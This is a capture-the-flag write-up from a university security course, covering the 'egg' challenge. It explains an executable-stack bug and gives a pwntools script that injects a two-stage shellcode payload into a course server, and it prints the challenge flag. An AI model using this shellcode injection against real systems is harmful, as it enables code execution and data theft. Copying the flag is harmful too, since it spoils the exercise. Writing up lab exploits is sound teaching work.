misc-2 | egg
===========================

Flag: `6447{16baa76c-2d52-4972-be1b-d8b600e2c335}`

General overview of problems faced
-------------------------------------
Had forgotten that calling a function added a return address to the stack and therefore moved the buffers esp offsets

List of vulnerabilities
--------------------
1. The stack is executable
2. The program executes the code in a small buffer by loading the buffer into eax and executing `call eax` which allows the user to input malicious code. Even if the first buffer is too small to execute malicious commands, it is possible to jump to the bigger buffer in order to execute a large payload.

Steps to exploit
------------------
1. Write the small buffer's assembly code to call [esp + 60] which contains the large buffer
2. Write the large buffer's assembly code to read 42 bytes from filehandle 1000 into esp and write 42 bytes from esp to STDOUT
3. Convert the assembly code to hex and send the small buffer then the big buffer. The flag will then be printed out.


Script/Command used
------------------
```python
#!/usr/bin/env python
# -*- encoding: utf-8 -*-

# flag: 6447{16baa76c-2d52-4972-be1b-d8b600e2c335}

from pwn import *

def generate_small_payload():
    payload = "mov eax, [esp+60];"
    payload += "call eax;"

    asm_payload = asm(payload)

    return asm_payload

def generate_large_payload():
    big_payload = shellcraft.read(1000, 'esp', 42)
    big_payload += shellcraft.write(1, 'esp', 42)

    return asm(big_payload)

def main():
    context.arch = 'i386'
    context.terminal = '/bin/sh'

    r = remote("misc.6447.sec.edu.au", 8006)

    r.sendline(generate_small_payload())
    r.sendline(generate_large_payload())

    print "Flag:", r.recvrepeat(0.2).split()[-1]

if __name__ == '__main__':
    main()
```
